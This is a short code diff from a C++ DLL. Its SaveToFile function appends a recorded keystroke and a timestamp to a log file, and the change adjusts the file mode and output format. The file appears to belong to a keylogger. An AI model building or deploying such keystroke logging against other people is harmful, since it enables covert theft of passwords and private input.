@@ -28,7 +28,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 
 int SaveToFile(int Key_Stroke, char *file) {
 	fstream myfile;
-	myfile.open(file, ios::out | ios::app | ios::binary);
+	myfile.open(file, ios::out | ios::app);
 
 	time_t ctt = time(0);
 	char curTime[100];
@@ -36,7 +36,7 @@ int SaveToFile(int Key_Stroke, char *file) {
 	localtime_s(&time, &ctt);
 	asctime_s(curTime, 100, &time);
 
-	myfile << Key_Stroke << curTime << endl;
+	myfile << Key_Stroke << " " << curTime;
 
 	myfile.close();
 	return 0;
